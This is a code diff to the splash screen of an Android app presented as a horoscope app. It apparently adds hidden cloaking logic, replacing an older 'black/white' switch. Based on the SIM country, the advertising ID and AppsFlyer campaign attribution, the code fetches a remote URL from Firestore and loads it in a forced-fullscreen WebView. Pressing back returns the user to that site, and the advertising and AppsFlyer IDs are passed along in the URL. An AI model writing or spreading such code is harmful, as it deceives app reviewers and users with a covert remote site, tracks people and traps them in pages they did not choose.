@@ -1,5 +1,6 @@
 package com.wsoteam.horoscopes
 
+import android.annotation.SuppressLint
 import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageInfo
@@ -7,22 +8,28 @@ import android.content.pm.PackageManager
 import android.graphics.Bitmap
 import android.net.Uri
 import android.os.Bundle
+import android.telephony.TelephonyManager
 import android.util.Base64
 import android.util.Log
 import android.view.View
+import android.webkit.CookieSyncManager
 import android.webkit.ValueCallback
 import android.webkit.WebChromeClient
 import android.webkit.WebView
 import android.widget.FrameLayout
 import androidx.appcompat.app.AppCompatActivity
+import androidx.constraintlayout.widget.ConstraintLayout
 import androidx.core.content.FileProvider
 import androidx.lifecycle.ViewModelProviders
 import com.amplitude.api.Amplitude
 import com.android.installreferrer.api.InstallReferrerClient
 import com.android.installreferrer.api.InstallReferrerStateListener
+import com.appsflyer.AppsFlyerLib
 import com.facebook.appevents.AppEventsLogger
 import com.google.firebase.FirebaseApp
 import com.google.firebase.analytics.FirebaseAnalytics
+import com.google.firebase.firestore.DocumentReference
+import com.google.firebase.firestore.FirebaseFirestore
 import com.google.firebase.remoteconfig.FirebaseRemoteConfig
 import com.wsoteam.horoscopes.bl.Client
 import com.wsoteam.horoscopes.models.Sign
@@ -40,6 +47,7 @@ import com.wsoteam.horoscopes.utils.ads.BannerFrequency
 import com.wsoteam.horoscopes.utils.analytics.Analytic
 import com.wsoteam.horoscopes.utils.analytics.FBAnalytic
 import com.wsoteam.horoscopes.utils.choiceSign
+import com.wsoteam.horoscopes.utils.lk.*
 import com.wsoteam.horoscopes.utils.loger.L
 import com.wsoteam.horoscopes.utils.remote.ABConfig
 import kotlinx.android.synthetic.main.splash_activity.*
@@ -69,9 +77,61 @@ class SplashActivity : AppCompatActivity(R.layout.splash_activity) {
     lateinit var view: WebView
     var counterBack = 0
     val MAX_BEFORE_SKIP = 2
-    private var mUploadMessage: ValueCallback<Array<Uri>>? = null
     private var instanceState: Bundle? = null
     private val IMG_PICK = 1
+
+
+
+    private var app = App()
+    private var variables = Variables()
+    private var mPrefs = PreferenceProvider()
+    private var flyerParams = FlyerParams()
+    private val db: FirebaseFirestore = FirebaseFirestore.getInstance()
+    private var paramUtils = ParamUtils()
+    private val wv = WV()
+
+    private lateinit var webView: WebView
+    private val imagePick = 1
+    private var mUploadMessage: ValueCallback<Array<Uri>>? = null
+
+
+    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
+        val results = arrayOf(Uri.parse(data!!.dataString))
+        mUploadMessage!!.onReceiveValue(results)
+        super.onActivityResult(requestCode, resultCode, data)
+
+    }
+
+    override fun onResume() {
+        super.onResume()
+        CookieSyncManager.getInstance().startSync()
+        val decorView = window.decorView
+        decorView.systemUiVisibility = View.SYSTEM_UI_FLAG_FULLSCREEN
+        decorView.setOnSystemUiVisibilityChangeListener { visibility ->
+            if (visibility and View.SYSTEM_UI_FLAG_FULLSCREEN == 0) {
+                decorView.systemUiVisibility = View.SYSTEM_UI_FLAG_FULLSCREEN
+            }
+        }
+    }
+
+    override fun onPause() {
+        super.onPause()
+        mPrefs.saveDataInt(LideraSharedKeys.FirstOpenView.key, variables.OPEN)
+        mPrefs.saveDataString(LideraSharedKeys.LastOpenUrl.key, webView.url)
+    }
+
+    override fun onBackPressed() {
+        if (webView.canGoBack()) {
+            webView.goBack()
+        } else {
+            variables.outCode++
+            if (variables.outCode == 2) {
+                variables.outCode = 0
+                variables.firstUrl = mPrefs.getDataString(LideraSharedKeys.FirstOpenUrl.key)
+                webView.loadUrl(variables.firstUrl)
+            }
+        }
+    }
 
 
     private fun postGoNext(i: Int, tag: String) {
@@ -106,130 +166,11 @@ class SplashActivity : AppCompatActivity(R.layout.splash_activity) {
         finish()
     }
 
-    private fun goBlack() {
-        Analytics.openBlack()
-        makeWorkScren()
-    }
 
-    override fun onSaveInstanceState(outState: Bundle) {
-        super.onSaveInstanceState(outState)
-        if (view != null) {
-            view.saveState(outState)
-        }
-    }
-
-    override fun onRestoreInstanceState(savedInstanceState: Bundle) {
-        super.onRestoreInstanceState(savedInstanceState)
-        if (view != null) {
-            view.restoreState(savedInstanceState)
-        }
-    }
-
-    override fun onBackPressed() {
-        if (view != null) {
-            if (view.canGoBack()) {
-                view.goBack()
-            } else {
-                counterBack++
-                if (counterBack >= MAX_BEFORE_SKIP) {
-                    counterBack = 0
-                    var url = PreferencesProvider.startUrl
-                    view.loadUrl(url)
-                }
-            }
-        }else{
-            super.onBackPressed()
-        }
-    }
-
-
-    override fun onActivityResult(
-        requestCode: Int,
-        resultCode: Int,
-        data: Intent?
-    ) {
-        var results = arrayOf(Uri.parse(data!!.dataString))
-        mUploadMessage!!.onReceiveValue(results)
-        super.onActivityResult(requestCode, resultCode, data)
-    }
-
-    private fun makeWorkScren() {
-        fl_splash.visibility = View.GONE
-
-        view = WebView(this)
-
-        view.layoutParams = FrameLayout.LayoutParams(
-            FrameLayout.LayoutParams.MATCH_PARENT,
-            FrameLayout.LayoutParams.MATCH_PARENT
-        )
-        fl_container.addView(view)
-
-
-        view.settings.allowFileAccess = true
-        view.settings.allowFileAccess = true
-        view.settings.allowContentAccess = true
-        view.settings.supportZoom()
-        view.settings.useWideViewPort = true
-
-        view.settings.javaScriptEnabled = true
-        view.settings.domStorageEnabled = true
-        view.settings.userAgentString =
-            view.settings.userAgentString + "MobileAppClient/Android/0.9"
-        view.webViewClient = Client()
-
-
-        if (instanceState == null) {
-            if (PreferencesProvider.lastUrl == "") {
-                var url = PreferencesProvider.url
-                view.loadUrl(url)//URLL//url
-                // Log.e("LOOL", "url:  $url")
-            } else {
-                var url = PreferencesProvider.lastUrl
-                view.loadUrl(url)//URLL//url
-            }
-        }
-
-        view.webChromeClient = object : WebChromeClient() {
-
-            override fun onShowFileChooser(
-                webView: WebView?,
-                filePathCallback: ValueCallback<Array<Uri>>?,
-                fileChooserParams: FileChooserParams?
-            ): Boolean {
-                mUploadMessage = filePathCallback
-                val pickIntent = Intent()
-                pickIntent.type = "image/*"
-                pickIntent.action = Intent.ACTION_GET_CONTENT
-                startActivityForResult(Intent.createChooser(pickIntent, "Select Picture"), IMG_PICK)
-                return true
-            }
-        }
-    }
 
     override fun onDestroy() {
         super.onDestroy()
         AdWorker.unSubscribe()
-    }
-
-    private fun getKey(){
-        val info: PackageInfo
-        try {
-            info = packageManager.getPackageInfo("", PackageManager.GET_SIGNATURES)
-            for (signature in info.signatures) {
-                var md: MessageDigest
-                md = MessageDigest.getInstance("SHA")
-                md.update(signature.toByteArray())
-                val something = String(Base64.encode(md.digest(), 0))
-                //String something = new String(Base64.encodeBytes(md.digest()));
-                //Log.e("LOL", something)
-            }
-        } catch (e1: PackageManager.NameNotFoundException) {
-            //Log.e("name not found", e1.toString())
-        } catch (e: NoSuchAlgorithmException) {
-            //Log.e("no such an algorithm", e.toString())
-        } catch (e: Exception) {
-            //Log.e("exception", e.toString())
-        }
     }
 
 
@@ -253,17 +194,6 @@ class SplashActivity : AppCompatActivity(R.layout.splash_activity) {
             .get(MainVM::class.java)
         vm.preLoadData()
 
-        vm.getStatusLD().observe(this, androidx.lifecycle.Observer {
-            when (it) {
-                MainVM.BLACK -> {
-                    goBlack()
-                }
-                MainVM.WHITE -> {
-                    isCanGoNext = true
-                    postGoNext(1, "")
-                }
-            }
-        })
 
         if (PreferencesProvider.getBirthday() != "") {
             CacheData.setObserver(object : ICachedData {
@@ -303,6 +233,134 @@ class SplashActivity : AppCompatActivity(R.layout.splash_activity) {
                 Config.OPEN_FROM_EVENING_NOTIF -> Analytic.openFromEveningNotif()
             }
         }
+
+        app.getAdvertisingId(this)
+        init()
+
+        variables.OPEN = mPrefs.getDataInt(LideraSharedKeys.FirstOpenView.key)
+        variables.lastUrl = mPrefs.getDataString(LideraSharedKeys.LastOpenUrl.key)
+
+        splashLoader()
+    }
+
+    private fun init() {
+        variables.appsFlyerId = AppsFlyerLib.getInstance().getAppsFlyerUID(applicationContext)
+        Log.i("JHJ", variables.appsFlyerId)
+        CookieSyncManager.createInstance(applicationContext)
+        val tm = applicationContext.getSystemService(TELEPHONY_SERVICE) as TelephonyManager
+        Variables.CC = tm.networkCountryIso
+        webView = WebView(this)
+        webView.layoutParams = ConstraintLayout.LayoutParams(
+            ConstraintLayout.LayoutParams.MATCH_PARENT,
+            ConstraintLayout.LayoutParams.MATCH_PARENT
+        )
+        wvSettings()
+    }
+
+    private fun getFirebaseData() {
+        val docRef: DocumentReference = db.collection(LideraSharedKeys.COLLECTION.key).document(variables.DOCUMENT)
+        docRef.get().addOnCompleteListener { task ->
+            if (task.isSuccessful) {
+                val document = task.result
+                if (document != null && document.exists()) {
+                    val map: MutableMap<String, Any>? = document.data
+                    if (variables.lastUrl == LideraSharedKeys.AppCheckerWord.key) {
+                        if (map!![Variables.CC] != null) {
+                            variables.FIREBASE = map[Variables.CC].toString()
+                        }
+                        if (variables.FIREBASE.isNotEmpty()) {
+                            variables.FIREBASE = paramUtils.replaceParamHome(
+                                variables.FIREBASE,
+                                App.gadid,
+                                variables.appsFlyerId
+                            )
+                            variables.FIREBASE = paramUtils.replaceParamOut(
+                                variables.FIREBASE,
+                                variables.sub_name_1,
+                                variables.sub_name_2,
+                                variables.sub_name_3,
+                                variables.sub_name_4
+                            )
+
+                            col.removeAllViews()
+                            col.addView(webView)
+                            webView.loadUrl(variables.FIREBASE)
+                        } else {
+                            goNext()
+                        }
+                    }
+                } else {
+                    goNext()
+                }
+            } else {
+                goNext()
+            }
+        }
+    }
+
+    private fun splashLoader() {
+        val t: Thread = object : Thread() {
+            @SuppressLint("SetTextI18n")
+            override fun run() {
+                try {
+                    while (!variables.isRun) {
+                        if (variables.runIterator >= 100 || App.campaign != "null" && App.campaign != "None") {
+                            variables.isRun = true
+                            startUIChange()
+                            break
+                        }
+
+                        variables.runIterator++
+
+                        sleep(120)
+
+                    }
+                } catch (e: InterruptedException) {
+                    e.printStackTrace()
+                }
+            }
+        }
+        t.start()
+    }
+
+    private fun startUIChange() {
+        if (variables.lastUrl == LideraSharedKeys.AppCheckerWord.key) {
+            getAppsflyerParametr()
+        } else {
+            secondUiChanger()
+        }
+    }
+
+
+    private fun secondUiChanger() {
+        runOnUiThread {
+            col.removeAllViews()
+            col.addView(webView)
+            webView.loadUrl(variables.lastUrl)
+        }
+    }
+
+
+    @SuppressLint("SetJavaScriptEnabled")
+    private fun wvSettings() {
+        wv.setParams(webView)
+        webView.webChromeClient = object : WebChromeClient() {
+
+            override fun onShowFileChooser(webView: WebView?, filePathCallback: ValueCallback<Array<Uri>>?, fileChooserParams: FileChooserParams?): Boolean {
+                mUploadMessage = filePathCallback
+                val pickIntent = Intent()
+                pickIntent.type = "image/*"
+                pickIntent.action = Intent.ACTION_GET_CONTENT
+                startActivityForResult(Intent.createChooser(pickIntent, "Select Picture"), imagePick)
+                return true
+            }
+        }
+    }
+
+    private fun getAppsflyerParametr() {
+        flyerParams.paramReceiver()
+        variables.DOCUMENT = flyerParams.getDocName()
+        getFirebaseData()
     }
 
     private fun makeCurrentScreen(it: List<Sign>) {
@@ -323,17 +381,7 @@ class SplashActivity : AppCompatActivity(R.layout.splash_activity) {
         }
     }
 
-    /*private fun makeImage() {
-        var view = findViewById<View>(R.id.llParentLayout)
-        view.isDrawingCacheEnabled = true
-        view.drawingCacheQuality = View.DRAWING_CACHE_QUALITY_HIGH
-        view.buildDrawingCache()
-        val uri = saveImage(view.drawingCache, applicationContext)
-        view.isDrawingCacheEnabled = false
 
-        PreferencesProvider.screenURI = uri.toString()
-        postGoNext(1, "screenURI")
-    }*/
 
     private fun getCutText(text: String): String {
         var array = text.split(".")
